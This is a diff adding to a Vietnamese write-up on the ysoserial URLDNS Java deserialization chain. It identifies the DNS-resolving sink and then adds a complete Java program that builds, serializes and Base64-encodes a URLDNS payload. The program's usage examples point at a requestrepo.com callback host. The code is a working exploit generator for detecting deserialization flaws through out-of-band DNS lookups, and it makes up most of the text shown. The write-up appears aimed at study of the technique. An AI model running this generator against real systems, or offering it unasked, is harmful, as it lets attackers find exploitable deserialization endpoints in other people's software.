@@ -233,7 +233,99 @@ Tìm thấy một hàm rất khả nghi ở đây vì ở đây nó thực hiệ
 
 Ta thấy rằng ở đây InetAddress `.getByName()` đã gọi đến host trong khi đó nó trỏ đến URL của ta thêm vào vậy đây chính là sink của cả payload là nơi thực thi resolve DNS. 
 
+Đây là file `Generation Payload` nó sẽ trả về file dưới dạng base64 format giống như payload do payload gốc đưa ra.
 
+```java 
+package ysoserial.payloads;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.*;
+import java.util.Base64;
+import java.util.HashMap;
+/**
+ * URLDNSPayloadGenerator
+ *
+ * - Tạo payload HashMap giống chain URLDNS (URL key với SilentURLStreamHandler).
+ * - Set URL.hashCode field = -1 bằng reflection để trigger lookup khi deserialize.
+ * - Nếu chỉ truyền <target-url>: in payload dưới dạng Base64 ra stdout (text).
+ */
+public class URLDNSPayloadGenerator {
+
+    public static class SilentURLStreamHandler extends URLStreamHandler {
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            throw new UnsupportedOperationException("Silent handler: no real connection");
+        }
+
+        protected InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+
+    public static Object makePayload(String targetUrl) throws Exception {
+        URLStreamHandler handler = new SilentURLStreamHandler();
+        HashMap<Object, Object> ht = new HashMap<>();
+        URL u = new URL(null, targetUrl, handler);
+        ht.put(u, targetUrl);
+
+        Field hashCodeField = URL.class.getDeclaredField("hashCode");
+        hashCodeField.setAccessible(true);
+        hashCodeField.setInt(u, -1); // URL.hashCode is int, so setInt is safe
+
+        return ht;
+    }
+
+    public static byte[] serialize(Object obj) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        oos.flush();
+        oos.close();
+        return baos.toByteArray();
+    }
+
+    public static void usage(PrintStream err) {
+        err.println("Usage: java URLDNSPayloadGenerator <target-url> [out-file]");
+        err.println("If no out-file provided, Base64-encoded payload is printed to stdout.");
+        err.println("If out-file is provided, raw binary payload is written to that file.");
+        err.println("Examples:");
+        err.println("  java URLDNSPayloadGenerator https://a7kvklhv.requestrepo.com/");
+        err.println("  java URLDNSPayloadGenerator https://a7kvklhv.requestrepo.com/ payload.bin");
+    }
+
+    public static void main(String[] args) {
+        if (args.length < 1) {
+            usage(System.err);
+            System.exit(64);
+        }
+
+        String target = args[0];
+        String outFile = (args.length >= 2) ? args[1] : null;
+
+        try {
+            Object payload = makePayload(target);
+            byte[] ser = serialize(payload);
+
+            if (outFile != null) {
+                try (FileOutputStream fos = new FileOutputStream(outFile)) {
+                    fos.write(ser);
+                }
+                System.err.println("Raw payload written to: " + outFile);
+            } else {
+                // In Base64 để dễ copy/paste (stdout là text, không binary)
+                String b64 = Base64.getEncoder().encodeToString(ser);
+                System.out.println(b64);
+            }
+        } catch (Throwable t) {
+            System.err.println("Error while generating payload:");
+            t.printStackTrace(System.err);
+            System.exit(70);
+        }
+    }
+}
+
+```
 
 
 
